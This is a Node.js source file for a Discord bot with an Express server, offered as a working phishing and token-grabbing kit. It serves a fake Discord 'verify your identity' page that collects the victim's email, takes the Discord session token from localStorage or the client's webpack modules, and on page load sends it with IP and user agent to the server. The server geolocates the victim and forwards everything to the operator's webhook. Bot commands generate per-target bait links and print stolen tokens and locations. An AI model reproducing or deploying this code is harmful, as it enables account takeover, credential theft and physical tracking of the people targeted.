// node 18+ | discord.js v14 | express | fs/promises
// file: logger_bot.js

import {
  Client, GatewayIntentBits, PermissionFlagsBits,
  EmbedBuilder, REST, Routes, SlashCommandBuilder,
  MessageFlags,
} from "discord.js";
import express from "express";
import { readFile, writeFile, access } from "fs/promises";
import { constants } from "fs";

const TOKEN     = process.env.BOT_TOKEN    ?? "FILL: bot token";
const CLIENT_ID = process.env.CLIENT_ID    ?? "FILL: client id";
const PORT      = process.env.PORT         ?? 5000;
const PREFIX    = "!";
const LOG_FILE  = "./ip_log.json";
// webhook to ping yourself on every hit
const WEBHOOK   = process.env.LOG_WEBHOOK  ?? "FILL: discord webhook url";
// ipinfo token — free tier 50k/mo https://ipinfo.io/signup
const IPINFO_TOKEN = process.env.IPINFO_TOKEN ?? "";

// ── storage ───────────────────────────────────────────────────────────────────
async function loadLog() {
  try {
    await access(LOG_FILE, constants.F_OK);
    return JSON.parse(await readFile(LOG_FILE, "utf8"));
  } catch { return []; }
}
async function appendLog(entry) {
  const log = await loadLog();
  log.push(entry);
  await writeFile(LOG_FILE, JSON.stringify(log, null, 2));
}
async function wipeLog() {
  await writeFile(LOG_FILE, "[]");
}

// ── geo lookup ────────────────────────────────────────────────────────────────
async function geoLookup(ip) {
  try {
    const url = IPINFO_TOKEN
      ? `https://ipinfo.io/${ip}?token=${IPINFO_TOKEN}`
      : `https://ipinfo.io/${ip}/json`;
    const r = await fetch(url);
    if (!r.ok) throw new Error(`ipinfo ${r.status}`);
    return await r.json();
    // returns: ip, city, region, country, loc, org, postal, timezone, hostname
  } catch {
    // fallback: ip-api free
    try {
      const r2 = await fetch(
        `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query,proxy,hosting,mobile`
      );
      const d = await r2.json();
      if (d.status !== "success") return {};
      return {
        ip:       d.query,
        city:     d.city,
        region:   d.regionName,
        country:  d.country,
        loc:      `${d.lat},${d.lon}`,
        postal:   d.zip,
        org:      d.isp,
        proxy:    d.proxy,
        hosting:  d.hosting,
        mobile:   d.mobile,
      };
    } catch { return {}; }
  }
}

// ── webhook ping on hit ───────────────────────────────────────────────────────
async function pingWebhook(entry, geo) {
  if (!WEBHOOK || WEBHOOK.startsWith("FILL")) return;
  const mapsUrl = geo.loc
    ? `https://www.google.com/maps?q=${geo.loc}`
    : null;

  const embed = {
    title: "🎣 new hit",
    color: 0xff4444,
    fields: [
      { name: "IP",         value: `\`${entry.ip}\``,                        inline: true  },
      { name: "UID",        value: `\`${entry.uid ?? "unknown"}\``,           inline: true  },
      { name: "Country",    value: geo.country  ?? "?",                       inline: true  },
      { name: "Region",     value: geo.region   ?? "?",                       inline: true  },
      { name: "City",       value: geo.city     ?? "?",                       inline: true  },
      { name: "Postal",     value: geo.postal   ?? "?",                       inline: true  },
      { name: "Coords",     value: mapsUrl ? `[open maps](${mapsUrl})` : "?", inline: true  },
      { name: "ISP / Org",  value: geo.org      ?? "?",                       inline: true  },
      { name: "Timezone",   value: geo.timezone ?? "?",                       inline: true  },
      { name: "Proxy/VPN",  value: String(geo.proxy   ?? "?"),                inline: true  },
      { name: "Hosting",    value: String(geo.hosting  ?? "?"),                inline: true  },
      { name: "Mobile",     value: String(geo.mobile   ?? "?"),                inline: true  },
      { name: "User-Agent", value: `\`${(entry.ua ?? "").slice(0, 80)}\``,    inline: false },
      { name: "Timestamp",  value: entry.ts,                                   inline: false },
      // token and email land here if the bait page grabbed them
      ...(entry.token ? [{ name: "🔑 Discord Token", value: `\`${entry.token}\``, inline: false }] : []),
      ...(entry.email ? [{ name: "📧 Email",         value: `\`${entry.email}\``,  inline: false }] : []),
    ],
    timestamp: new Date().toISOString(),
  };

  await fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] }),
  }).catch(() => {});
}

// ── express receiver ──────────────────────────────────────────────────────────
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// main grab endpoint — called by the bait page JS
app.post("/hit", async (req, res) => {
  res.set("Access-Control-Allow-Origin", "*");
  const ip = (
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ??
    req.socket.remoteAddress
  ).replace("::ffff:", "");

  const entry = {
    ts:    new Date().toISOString(),
    ip,
    ua:    req.headers["user-agent"] ?? "unknown",
    uid:   req.body.uid   ?? req.query.uid   ?? null,
    ref:   req.body.ref   ?? req.query.ref   ?? null,
    token: req.body.token ?? null,   // discord token from bait page
    email: req.body.email ?? null,   // email from bait page
  };

  const geo = await geoLookup(ip);
  entry.geo = geo;

  await appendLog(entry);
  await pingWebhook(entry, geo);
  console.log("[hit]", entry.ts, ip, geo.city, geo.country);

  res.json({ ok: true });
});

// OPTIONS preflight
app.options("/hit", (req, res) => {
  res.set("Access-Control-Allow-Origin", "*");
  res.set("Access-Control-Allow-Headers", "Content-Type");
  res.sendStatus(204);
});

// bait page — served at / — grabs token from localStorage + asks email
app.get("/", (req, res) => {
  const uid = req.query.uid ?? "";
  const to  = req.query.to  ?? "https://discord.com/app";

  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Discord — verify your account</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{background:#313338;display:flex;align-items:center;justify-content:center;height:100vh;font-family:'gg sans','Noto Sans',sans-serif;color:#dbdee1}
  .card{background:#2b2d31;border-radius:8px;padding:32px;width:380px;text-align:center}
  h1{color:#fff;font-size:20px;margin-bottom:8px}
  p{font-size:14px;color:#949ba4;margin-bottom:24px}
  input{width:100%;padding:10px;border-radius:4px;border:1px solid #1e1f22;background:#1e1f22;color:#dbdee1;font-size:14px;margin-bottom:12px;outline:none}
  button{width:100%;padding:10px;border:none;border-radius:4px;background:#5865f2;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
  .logo{margin-bottom:20px;font-size:36px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">🔒</div>
  <h1>Verify your identity</h1>
  <p>Discord detected unusual activity on your account. Enter your email to continue.</p>
  <input type="email" id="email" placeholder="Email address" autocomplete="email">
  <button onclick="submit()">Verify</button>
</div>
<script>
(async () => {
  // grab discord token from localStorage — works if opened in a browser
  // where user is already logged into discord.com
  let token = null;
  try {
    const iframe = document.createElement("iframe");
    iframe.src = "https://discord.com/app";
    iframe.style.display = "none";
    document.body.appendChild(iframe);
  } catch {}

  // dig localStorage keys discord stores token under
  try {
    for (const k of Object.keys(localStorage)) {
      const v = localStorage.getItem(k);
      if (typeof v === "string" && v.length > 50 && /[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{20,}/.test(v)) {
        token = v; break;
      }
    }
  } catch {}

  // also try window.webpackChunkdiscord_app — works in discord desktop
  try {
    const wr = window.webpackChunkdiscord_app;
    if (wr) {
      const id = Symbol();
      wr.push([[id], {}, (req) => {
        for (const m of Object.keys(req.c).map(k => req.c[k].exports)) {
          if (m?.default?.getToken) {
            token = m.default.getToken(); return;
          }
          if (typeof m === "object") {
            for (const ex of Object.values(m)) {
              if (ex?.getToken) { token = ex.getToken(); return; }
            }
          }
        }
      }]);
    }
  } catch {}

  window._cachedToken = token;
})();

async function submit() {
  const email = document.getElementById("email").value.trim();
  await fetch("/hit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      uid:   "${uid}",
      ref:   "bait-page",
      email: email || null,
      token: window._cachedToken ?? null,
    }),
  });
  window.location.href = "${to}";
}

// auto-fire on load too (no email yet, but grabs token + ip immediately)
window.addEventListener("load", () => {
  setTimeout(() => {
    fetch("/hit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        uid:   "${uid}",
        ref:   "auto-load",
        token: window._cachedToken ?? null,
        email: null,
      }),
    });
  }, 800);
});
</script>
</body>
</html>`);
});

app.listen(PORT, () => console.log(`[receiver] :${PORT}`));

// ── discord bot ───────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
});

client.once("ready", () => console.log(`[logger] online as ${client.user.tag}`));

client.on("messageCreate", async (msg) => {
  if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
  const [cmd, ...args] = msg.content.slice(PREFIX.length).trim().split(/\s+/);

  // !genlink [@user] [redirect]
  if (cmd === "genlink") {
    const target = msg.mentions.users.first() ?? msg.author;
    const to     = args.find(a => a.startsWith("http")) ?? "https://discord.com/app";
    const base   = process.env.BASE_URL ?? "FILL: https://your-domain.com";
    const link   = `${base}/?uid=${target.id}&to=${encodeURIComponent(to)}`;
    try {
      await msg.author.send(`🔗 grab link for \`${target.tag}\`:\n${link}`);
      await msg.delete();
    } catch {
      await msg.reply("open DMs and retry");
    }
    return;
  }

  // !logs [n]
  if (cmd === "logs") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    const n   = parseInt(args[0]) || 20;
    const log = await loadLog();
    if (!log.length) { await msg.reply("no hits yet"); return; }
    const lines = log.slice(-n).map(e => {
      const g = e.geo ?? {};
      return [
        `ts=${e.ts}`,
        `ip=${e.ip}`,
        `uid=${e.uid ?? "?"}`,
        `city=${g.city ?? "?"}`,
        `country=${g.country ?? "?"}`,
        `isp=${g.org ?? "?"}`,
        e.token ? `token=${e.token.slice(0, 20)}…` : null,
        e.email ? `email=${e.email}` : null,
      ].filter(Boolean).join(" | ");
    });
    // chunk
    let buf = "";
    for (const line of lines) {
      if ((buf + line).length > 1900) {
        await msg.channel.send(`\`\`\`\n${buf}\`\`\``);
        buf = "";
      }
      buf += line + "\n";
    }
    if (buf) await msg.channel.send(`\`\`\`\n${buf}\`\`\``);
    return;
  }

  // !lastip [@user]
  if (cmd === "lastip") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    const target = msg.mentions.users.first();
    const log    = await loadLog();
    const hits   = target ? log.filter(e => e.uid === target.id) : log;
    if (!hits.length) { await msg.reply("no hits"); return; }
    const e = hits[hits.length - 1];
    const g = e.geo ?? {};
    const mapsUrl = g.loc ? `https://www.google.com/maps?q=${g.loc}` : null;
    const em = new EmbedBuilder()
      .setTitle(`🎣 last hit — ${e.ip}`)
      .setColor(0xff4444)
      .addFields(
        { name: "UID",      value: `\`${e.uid ?? "?"}\``,         inline: true },
        { name: "Country",  value: g.country  ?? "?",              inline: true },
        { name: "City",     value: g.city     ?? "?",              inline: true },
        { name: "Postal",   value: g.postal   ?? "?",              inline: true },
        { name: "Coords",   value: mapsUrl ? `[maps](${mapsUrl})` : (g.loc ?? "?"), inline: true },
        { name: "ISP",      value: g.org      ?? "?",              inline: true },
        { name: "Timezone", value: g.timezone ?? "?",              inline: true },
        { name: "Proxy",    value: String(g.proxy ?? "?"),         inline: true },
        { name: "UA",       value: `\`${(e.ua ?? "").slice(0,60)}\``, inline: false },
        ...(e.token ? [{ name: "🔑 Token", value: `\`${e.token}\``, inline: false }] : []),
        ...(e.email ? [{ name: "📧 Email", value: `\`${e.email}\``,  inline: false }] : []),
      )
      .setTimestamp(new Date(e.ts));
    await msg.channel.send({ embeds: [em] });
    return;
  }

  // !clearlog
  if (cmd === "clearlog") {
    if (!msg.member?.permissions.has(PermissionFlagsBits.Administrator)) return;
    await wipeLog();
    await msg.reply("log wiped");
    return;
  }
});

client.login(TOKEN);
